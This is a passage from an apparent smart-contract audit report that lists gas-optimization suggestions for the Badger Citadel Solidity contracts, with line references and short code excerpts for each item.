[428](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L428))\r\n```solidity\r\n        for (uint256 i = 0; i < 128; i++) {\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [634](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L634))\r\n```solidity\r\n        uint256 reward = 0;\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [838](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L838))\r\n```solidity\r\n            for (uint i = 0; i < rewardTokens.length; i++) {\r\n```\r\n9. File: src/CitadelMinter.sol (line [152](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L152))\r\n```solidity\r\n        for (uint256 i = 0; i < numPools; i++) {\r\n```\r\n10. File: src/CitadelMinter.sol (line [180](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L180))\r\n```solidity\r\n        uint256 lockingAmount = 0;\r\n```\r\n11. File: src/CitadelMinter.sol (line [181](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L181))\r\n```solidity\r\n        uint256 stakingAmount = 0;\r\n```\r\n12. File: src/CitadelMinter.sol (line [182](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L182))\r\n```solidity\r\n        uint256 fundingAmount = 0;\r\n```\r\n13. File: src/lib/GlobalAccessControlManaged.sol (line [48](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L48))\r\n```solidity\r\n        for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\n14. File: src/SupplySchedule.sol (line [103](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L103))\r\n```solidity\r\n        uint256 mintable = 0;\r\n```\r\n15. File: src/SupplySchedule.sol (line [192](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L192))\r\n```solidity\r\n        uint256 mintable = 0;\r\n```\r\n\r\n### `internal` functions only called once can be inlined to save gas\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [747](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L747))\r\n```solidity\r\n    function updateStakeRatio(uint256 _offset) internal {\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [796](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L796))\r\n```solidity\r\n    function _notifyReward(address _rewardsToken, uint256 _reward) internal {\r\n```\r\n3. File: src/CitadelMinter.sol (line [338](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L338))\r\n```solidity\r\n    function _transferToFundingPools(uint256 _citadelAmount) internal {\r\n```\r\n4. File: src/CitadelMinter.sol (line [362](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L362))\r\n```solidity\r\n    function _removeFundingPool(address _pool) internal {\r\n```\r\n5. File: src/CitadelMinter.sol (line [374](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L374))\r\n```solidity\r\n    function _addFundingPool(address _pool) internal {\r\n```\r\n6. File: src/StakedCitadel.sol (lines [764-766](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L764-L766))\r\n```solidity\r\n    function _depositFor(address _recipient, uint256 _amount)\r\n        internal\r\n        nonReentrant\r\n```\r\n7. File: src/StakedCitadel.sol (lines [859-862](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L859-L862))\r\n```solidity\r\n    function _calculatePerformanceFee(uint256 _amount)\r\n        internal\r\n        view\r\n        returns (uint256, uint256)\r\n```\r\n8. File: src/StakedCitadel.sol (line [898](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L898))\r\n```solidity\r\n    function _handleFees(uint256 _harvestedAmount, uint256 harvestTime)\r\n```\r\n9. File: src/SupplySchedule.sol (lines [169-170](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L169-L170))\r\n```solidity\r\n    function _setEpochRates() internal {\r\n        epochRate[0] = 593962000000000000000000 / epochLength;\r\n```\r\n\r\n### Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas\r\n\r\n1. File: src/GlobalAccessControl.sol (line [109](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L109))\r\n```solidity\r\n        string memory roleString,\r\n```\r\n2. File: src/StakedCitadel.sol (line [319](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L319))\r\n```solidity\r\n    function deposit(uint256 _amount, bytes32[] memory proof)\r\n```\r\n3. File: src/StakedCitadel.sol (line [341](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L341))\r\n```solidity\r\n    function depositAll(bytes32[] memory proof) external whenNotPaused {\r\n```\r\n4. File: src/StakedCitadel.sol (line [366](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L366))\r\n```solidity\r\n        bytes32[] memory proof\r\n```\r\n\r\n### `++i` costs less gas than `++i`, especially when it's used in `for`-loops (`--i`/`i--` too)\r\n\r\n1. File: external/MedianOracle.sol (line [164](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L164))\r\n```solidity\r\n        for (uint256 i = 0; i < reportsCount; i++) {\r\n```\r\n2. File: external/MedianOracle.sol (line [226](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L226))\r\n```solidity\r\n        for (uint256 i = 0; i < providers.length; i++) {\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [267](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L267))\r\n```solidity\r\n        for (uint256 i = 0; i < userRewards.length; i++) {\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [296](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L296))\r\n```solidity\r\n        for (uint i = nextUnlockIndex; i < locksLength; i++) {\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [325](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L325))\r\n```solidity\r\n        for (uint i = locks.length - 1; i + 1 != 0; i--) {\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [363](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L363))\r\n```solidity\r\n        for (uint i = locks.length - 1; i + 1 != 0; i--) {\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [391](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L391))\r\n```solidity\r\n        for (uint i = epochindex - 1; i + 1 != 0; i--) {\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [409](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L409))\r\n```solidity\r\n        for (uint i = _epoch; i + 1 != 0; i--) {\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [428](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L428))\r\n```solidity\r\n        for (uint256 i = 0; i < 128; i++) {\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [459](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L459))\r\n```solidity\r\n        for (uint i = nextUnlockIndex; i < locks.length; i++) {\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [659](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L659))\r\n```solidity\r\n            for (uint i = nextUnlockIndex; i < length; i++) {\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [777](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L777))\r\n```solidity\r\n        for (uint i; i < rewardTokens.length; i++) {\r\n```\r\n13. File: external/StakedCitadelLocker.sol (line [838](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L838))\r\n```solidity\r\n            for (uint i = 0; i < rewardTokens.length; i++) {\r\n```\r\n14. File: src/CitadelMinter.sol (line [152](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L152))\r\n```solidity\r\n        for (uint256 i = 0; i < numPools; i++) {\r\n```\r\n15. File: src/lib/GlobalAccessControlManaged.sol (line [48](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L48))\r\n```solidity\r\n        for (uint256 i = 0; i < roles.length; i++) {\r\n```\r\n16. File: src/SupplySchedule.sol (line [208](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L208))\r\n```solidity\r\n        for (uint256 i = startingEpoch; i <= endingEpoch; i++) {\r\n```\r\n\r\n### Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead\r\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\r\n\r\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\r\nUse a larger size then downcast where needed\r\n\r\n1. File: external/MedianOracle.sol (line [125](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L125))\r\n```solidity\r\n        uint8 index_recent = timestamps[0] >= timestamps[1] ? 0 : 1;\r\n```\r\n2. File: external/MedianOracle.sol (line [126](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L126))\r\n```solidity\r\n        uint8 index_past = 1 - index_recent;\r\n```\r\n3. File: external/MedianOracle.sol (line [168](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L168))\r\n```solidity\r\n            uint8 index_recent = reports[0].timestamp >= reports[1].timestamp ? 0 : 1;\r\n```\r\n4. File: external/MedianOracle.sol (line [169](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L169))\r\n```solidity\r\n            uint8 index_past = 1 - index_recent;\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [38](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L38))\r\n```solidity\r\n        uint40 periodFinish;\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [39](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L39))\r\n```solidity\r\n        uint208 rewardRate;\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [40](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L40))\r\n```solidity\r\n        uint40 lastUpdateTime;\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [41](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L41))\r\n```solidity\r\n        uint208 rewardPerTokenStored;\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [44](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L44))\r\n```solidity\r\n        uint112 locked;\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [45](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L45))\r\n```solidity\r\n        uint112 boosted;\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [46](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L46))\r\n```solidity\r\n        uint32 nextUnlockIndex;\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [49](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L49))\r\n```solidity\r\n        uint112 amount;\r\n```\r\n13. File: external/StakedCitadelLocker.sol (line [50](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L50))\r\n```solidity\r\n        uint112 boosted;\r\n```\r\n14. File: external/StakedCitadelLocker.sol (line [51](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L51))\r\n```solidity\r\n        uint32 unlockTime;\r\n```\r\n15. File: external/StakedCitadelLocker.sol (line [58](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L58))\r\n```solidity\r\n        uint224 supply; //epoch boosted supply\r\n```\r\n16. File: external/StakedCitadelLocker.sol (line [59](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L59))\r\n```solidity\r\n        uint32 date; //epoch start date\r\n```\r\n17. File: external/StakedCitadelLocker.sol (line [117](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L117))\r\n```solidity\r\n    uint8 private _decimals;\r\n```\r\n18. File: external/StakedCitadelLocker.sol (line [142](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L142))\r\n```solidity\r\n    function decimals() public view returns (uint8) {\r\n```\r\n19. File: external/StakedCitadelLocker.sol (line [538](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L538))\r\n```solidity\r\n        uint112 lockAmount = _amount.sub(spendAmount).to112();\r\n```\r\n20. File: external/StakedCitadelLocker.sol (line [539](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L539))\r\n```solidity\r\n        uint112 boostedAmount = _amount.add(_amount.mul(boostRatio).div(denominator)).to112();\r\n```\r\n21. File: external/StakedCitadelLocker.sol (line [631](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L631))\r\n```solidity\r\n        uint112 locked;\r\n```\r\n22. File: external/StakedCitadelLocker.sol (line [632](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L632))\r\n```solidity\r\n        uint112 boostedAmount;\r\n```\r\n23. File: external/StakedCitadelLocker.sol (line [658](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L658))\r\n```solidity\r\n            uint32 nextUnlockIndex = userBalance.nextUnlockIndex;\r\n```\r\n24. File: src/KnightingRound.sol (line [78](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L78))\r\n```solidity\r\n        uint8 indexed daoId,\r\n```\r\n25. File: src/KnightingRound.sol (line [164](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L164))\r\n```solidity\r\n        uint8 _daoId,\r\n```\r\n\r\n### Expressions for constant values such as a call to `keccak256()`, should use `immutable` rather than `constant`\r\nSee [this](https://github.com/ethereum/solidity/issues/9232) issue for a detail description of the issue\r\n\r\n1. File: src/CitadelMinter.sol (lines [30-31](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L30-L31))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n2. File: src/CitadelMinter.sol (lines [32-33](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L32-L33))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\n3. File: src/CitadelToken.sol (lines [9-10](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L9-L10))\r\n```solidity\r\n    bytes32 public constant CITADEL_MINTER_ROLE =\r\n        keccak256(\"CITADEL_MINTER_ROLE\");\r\n```\r\n4. File: src/Funding.sol (lines [21-22](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L21-L22))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n5. File: src/Funding.sol (lines [23-24](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L23-L24))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\n6. File: src/Funding.sol (line [25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L25))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE = keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\n7. File: src/Funding.sol (lines [26-27](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L26-L27))\r\n```solidity\r\n    bytes32 public constant TREASURY_VAULT_ROLE =\r\n        keccak256(\"TREASURY_VAULT_ROLE\");\r\n```\r\n8. File: src/Funding.sol (line [28](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L28))\r\n```solidity\r\n    bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\r\n```\r\n9. File: src/GlobalAccessControl.sol (lines [25-26](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L25-L26))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n10. File: src/GlobalAccessControl.sol (lines [27-28](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L27-L28))\r\n```solidity\r\n    bytes32 public constant TREASURY_GOVERNANCE_ROLE =\r\n        keccak256(\"TREASURY_GOVERNANCE_ROLE\");\r\n```\r\n11. File: src/GlobalAccessControl.sol (lines [30-31](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L30-L31))\r\n```solidity\r\n    bytes32 public constant TECH_OPERATIONS_ROLE =\r\n        keccak256(\"TECH_OPERATIONS_ROLE\");\r\n```\r\n12. File: src/GlobalAccessControl.sol (lines [32-33](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L32-L33))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\n13. File: src/GlobalAccessControl.sol (lines [34-35](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L34-L35))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE =\r\n        keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\n14. File: src/GlobalAccessControl.sol (line [37](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L37))\r\n```solidity\r\n    bytes32 public constant KEEPER_ROLE = keccak256(\"KEEPER_ROLE\");\r\n```\r\n15. File: src/GlobalAccessControl.sol (line [39](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L39))\r\n```solidity\r\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\r\n```\r\n16. File: src/GlobalAccessControl.sol (line [40](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L40))\r\n```solidity\r\n    bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\r\n```\r\n17. File: src/GlobalAccessControl.sol (lines [42-43](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L42-L43))\r\n```solidity\r\n    bytes32 public constant BLOCKLIST_MANAGER_ROLE =\r\n        keccak256(\"BLOCKLIST_MANAGER_ROLE\");\r\n```\r\n18. File: src/GlobalAccessControl.sol (line [44](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L44))\r\n```solidity\r\n    bytes32 public constant BLOCKLISTED_ROLE = keccak256(\"BLOCKLISTED_ROLE\");\r\n```\r\n19. File: src/GlobalAccessControl.sol (lines [46-47](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L46-L47))\r\n```solidity\r\n    bytes32 public constant CITADEL_MINTER_ROLE =\r\n        keccak256(\"CITADEL_MINTER_ROLE\");\r\n```\r\n20. File: src/KnightingRound.sol (lines [19-20](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L19-L20))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n21. File: src/KnightingRound.sol (lines [21-22](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L21-L22))\r\n```solidity\r\n    bytes32 public constant TREASURY_GOVERNANCE_ROLE =\r\n        keccak256(\"TREASURY_GOVERNANCE_ROLE\");\r\n```\r\n22. File: src/KnightingRound.sol (lines [24-25](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L24-L25))\r\n```solidity\r\n    bytes32 public constant TECH_OPERATIONS_ROLE =\r\n        keccak256(\"TECH_OPERATIONS_ROLE\");\r\n```\r\n23. File: src/KnightingRound.sol (lines [26-27](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L26-L27))\r\n```solidity\r\n    bytes32 public constant TREASURY_OPERATIONS_ROLE =\r\n        keccak256(\"TREASURY_OPERATIONS_ROLE\");\r\n```\r\n24. File: src/lib/GlobalAccessControlManaged.sol (line [15](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L15))\r\n```solidity\r\n    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\r\n```\r\n25. File: src/lib/GlobalAccessControlManaged.sol (line [16](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L16))\r\n```solidity\r\n    bytes32 public constant UNPAUSER_ROLE = keccak256(\"UNPAUSER_ROLE\");\r\n```\r\n26. File: src/StakedCitadelVester.sol (lines [20-21](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L20-L21))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n27. File: src/SupplySchedule.sol (lines [22-23](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L22-L23))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n\r\n### Using `private` rather than `public` for constants, saves gas\r\nIf needed, the value can be read from the verified contract source code\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [70](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L70))\r\n```solidity\r\n    uint256 public constant rewardsDuration = 86400; // 1 day\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [73](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L73))\r\n```solidity\r\n    uint256 public constant lockDuration = rewardsDuration * 7 * 21; // 21 weeks\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [98](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L98))\r\n```solidity\r\n    uint256 public constant denominator = 10000;\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [105](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L105))\r\n```solidity\r\n    uint256 public constant stakeOffsetOnLock = 500; //allow broader range for staking when depositing\r\n```\r\n5. File: src/CitadelMinter.sol (lines [30-31](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L30-L31))\r\n```solidity\r\n    bytes32 public constant CONTRACT_GOVERNANCE_ROLE =\r\n        keccak256(\"CONTRACT_GOVERNANCE_ROLE\");\r\n```\r\n6. File: src/CitadelMinter.sol (lines [32-33](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L32-L33))\r\n```solidity\r\n    bytes32 public constant POLICY_OPERATIONS_ROLE =\r\n        keccak256(\"POLICY_OPERATIONS_ROLE\");\r\n```\r\n7. File: src/CitadelToken.sol (lines [9-10](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelToken.sol#L9-L10))\r\n```solidity\r\n    bytes32 public constant CITADEL_MINTER_ROLE =\r\n        keccak256(\"CITADEL_MINTER_ROLE\");\r\n```\r\n8. File: src/Funding.sol (lines [21-22](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L21-L22))\r\n```solidity\r\n    